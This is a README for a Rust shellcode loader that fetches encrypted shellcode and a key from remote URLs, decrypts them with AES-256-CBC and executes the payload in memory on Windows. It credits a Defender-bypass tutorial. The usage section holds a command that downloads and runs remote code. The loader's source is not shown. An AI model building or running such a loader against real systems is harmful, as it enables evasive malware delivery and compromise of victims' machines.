AES-256-CBC Shellcode Decryptor and Executor in Rust

This Rust application fetches encrypted shellcode and an encryption key from provided URLs, decrypts the shellcode using AES-256-CBC, and executes it in memory on Windows systems. It uses PBKDF2-inspired concepts and relies on Windows API calls for memory allocation and execution. This project was inspired by foundational knowledge from Gemini Cyber Security’s video "Getting Started with Rust - Bypass Windows Defender".

Note: This tool is intended for educational and security research purposes only. Use responsibly and in compliance with applicable laws.
Features

    AES-256-CBC Decryption: Decrypts shellcode using the AES-256 algorithm in CBC mode.
    Remote File Fetching: Retrieves encrypted shellcode and keys from HTTP URLs using reqwest.
    In-Memory Execution: Allocates memory and executes decrypted shellcode via Windows API calls (VirtualAlloc, VirtualProtect, CreateThread).
    Zero-Initialized IV: Uses a static IV for simplicity (not recommended for production use).

Prerequisites

    Rust: Ensure Rust is installed. Install it via Rustup if needed:
    bash

    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
    Windows OS: This project uses Windows-specific APIs (windows-sys) and is not compatible with other operating systems.
    Internet Access: Required to fetch files from provided URLs.

Building the Project
1. Clone the Repository

Clone this repository and navigate to the project directory:
bash
git clone <repository_url>
cd <repository_name>
2. Install Dependencies

The project relies on several Rust crates. Ensure your Cargo.toml includes the following:
toml
[dependencies]
aes = "0.8"
block-modes = "0.8"
pbkdf2 = "0.12"
sha2 = "0.10"
hex = "0.4"
hmac = "0.12"
reqwest = { version = "0.11", features = ["blocking"] }
windows-sys = { version = "0.52", features = ["Win32_Foundation", "Win32_System_Memory", "Win32_System_Threading"] }

Then, build the project in release mode:
bash
cargo build --release

The compiled binary will be located in the target/release directory.
Usage

Run the application with the following command, providing URLs to the encrypted shellcode and the encryption key:
bash
./target/release/rust -exec <http://ip_address/encrypted> <http://ip_address/key>
Example
bash
./target/release/rust -exec http://example.com/encrypted_shellcode http://example.com/key

This will:

    Fetch the encrypted shellcode and key from the specified URLs.
    Decrypt the shellcode using AES-256-CBC with a zero-initialized IV.
    Allocate executable memory, copy the decrypted shellcode, and execute it as a new thread.

If successful, the program will output:
text
Decryption and execution succeeded.
Security Considerations

    Static IV: The initialization vector (IV) is set to zero, which compromises security by making the encryption predictable. For real-world use, use a cryptographically secure random IV.
    Key Management: The key is fetched remotely but not validated. Ensure the key source is trusted and secure.
    Shellcode Execution: Executing arbitrary code in memory can be dangerous and is intended for controlled environments only.
    Error Handling: Basic error reporting is implemented, but robust error handling should be added for production use.

Credits

This project was inspired by Gemini Cyber Security and their video "Getting Started with Rust - Bypass Windows Defender". Special thanks to them for their educational content that helped guide this development.
License

This project is licensed under the MIT License. See the LICENSE file for details.
Disclaimer

This tool is for educational and research purposes only. The author is not responsible for any misuse or damage caused by this software. Use it at your own risk and ensure compliance with all relevant laws and regulations.
